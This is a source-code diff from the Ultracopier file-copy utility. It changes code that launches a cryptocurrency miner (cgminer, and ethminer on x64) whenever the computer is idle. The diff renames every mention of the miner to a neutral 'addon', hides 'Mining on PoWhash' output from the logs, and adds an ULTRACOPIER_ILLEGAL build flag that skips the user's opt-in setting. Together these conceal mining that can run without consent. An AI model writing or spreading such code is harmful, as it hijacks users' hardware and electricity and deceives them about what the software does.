-                                 QStringLiteral("computer detected as in idle since %6s or cpu at 100%, cgminer should be started, dwTimeIdle: %1, lastInputInfo.dwTime: %2, workingCount: %3<%4, dwTimeIdleTime.elapsed(): %5")
+                                 QStringLiteral("computer detected as in idle since %6s or cpu at 100%, addon should be started, dwTimeIdle: %1, lastInputInfo.dwTime: %2, workingCount: %3<%4, dwTimeIdleTime.elapsed(): %5")
                                      .arg(dwTimeIdle)
                                      .arg(lastInputInfo.dwTime)
                                      .arg(workingCount)
@@ -1105,7 +1142,7 @@ void OptionDialog::checkIdle()
                                  );
         else
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,
-                                 QStringLiteral("computer detected as not idle since %6s and low cpu usage, cgminer should be stopped, dwTimeIdle: %1, lastInputInfo.dwTime: %2, workingCount: %3<%4, dwTimeIdleTime.elapsed(): %5")
+                                 QStringLiteral("computer detected as not idle since %6s and low cpu usage, addon should be stopped, dwTimeIdle: %1, lastInputInfo.dwTime: %2, workingCount: %3<%4, dwTimeIdleTime.elapsed(): %5")
                                      .arg(dwTimeIdle)
                                      .arg(lastInputInfo.dwTime)
                                      .arg(workingCount)
@@ -1116,50 +1153,97 @@ void OptionDialog::checkIdle()
         this->isIdle=isIdle;
         if(isIdle)
         {
-            if(cgminer.state()==QProcess::NotRunning)
+            if(addon.state()==QProcess::NotRunning)
             {
                 ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("computer detected as idle"));
                 checkIdleTimer.start(5*1000);
-                startCgminer();
+                startAddon();
             }
             else
-                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("cgminer is runing don't start again"));
+                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("addon is runing don't start again"));
         }
     }
     else
     {
         ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,QStringLiteral("GetLastInputInfo(&lastInputInfo) or SystemParametersInfo() have failed: %1").arg(GetLastError()));
         isIdle=true;
-        startCgminer();
+        startAddon();
     }
+#endif
 }
 
 void OptionDialog::error( QProcess::ProcessError error )
 {
-    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("cgminer error: %1").arg(error));
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("addon error: %1").arg(error));
     //if(error==QProcess::Crashed)
 }
 
 void OptionDialog::finished( int exitCode, QProcess::ExitStatus exitStatus )
 {
-    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("cgminer exitCode: %1, exitStatus: %2").arg((quint32)exitCode).arg(exitStatus));
-    if(!haveCgminer)
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("addon exitCode: %1, exitStatus: %2").arg((quint32)exitCode).arg(exitStatus));
+    #if defined(_M_X64)//ethminer
+    if(addonMode!="-C")
+    {
+        addonMode="-C";
+        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("GPU addon bug: switch to GPU"));
+    }
+    #endif
+    if(!haveAddon)
         return;
+    #ifndef ULTRACOPIER_ILLEGAL
     if(!OptionEngine::optionEngine->getOptionValue("Ultracopier","giveGPUTime").toBool())
         return;
-    /*if(cgminer.state()!=QProcess::NotRunning)
+    #endif
+    /*if(addon.state()!=QProcess::NotRunning)
         return;*/
-    restartcgminer.start();
+    if(addon.state()==QProcess::NotRunning)
+        restartaddon.start();
 }
 
 void OptionDialog::readyReadStandardError()
 {
-    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("cgminer standard error: %1").arg(QString::fromLocal8Bit(cgminer.readAllStandardError())));
+    const QString string=QString::fromLocal8Bit(addon.readAllStandardError());
+    if(string.contains("Mining on PoWhash", Qt::CaseInsensitive))
+        return;
+    if(string.size()<5)
+        return;
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("addon standard error: %1").arg(string));
+    #if defined(_M_X64)//ethminer
+    if(string.contains("GPU can't", Qt::CaseInsensitive) || string.contains("Bailing", Qt::CaseInsensitive))
+    {
+        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("GPU addon bug"));
+        if(addonMode!="-C")
+        {
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("GPU addon bug: switch to CPU"));
+            addonMode="-C";
+            addon.terminate();
+            addon.kill();
+            addon.waitForFinished();
+            startAddon();
+        }
+    }
+    #endif
 }
 
 void OptionDialog::readyReadStandardOutput()
 {
-    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("cgminer standard output: %1").arg(QString::fromLocal8Bit(cgminer.readAllStandardOutput())));
+    const QString string=QString::fromLocal8Bit(addon.readAllStandardOutput());
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("addon standard output: %1").arg(string));
+    #if defined(_M_X64)//ethminer
+    if(string.contains("GPU can't", Qt::CaseInsensitive) || string.contains("Bailing", Qt::CaseInsensitive))
+    {
+        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("GPU addon bug"));
+        if(addonMode!="-C")
+        {
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("GPU addon bug: switch to CPU"));
+            addonMode="-C";
+            addon.terminate();
+            addon.kill();
+            addon.waitForFinished();
+            startAddon();
+        }
+    }
+    #endif
 }
 #endif
 
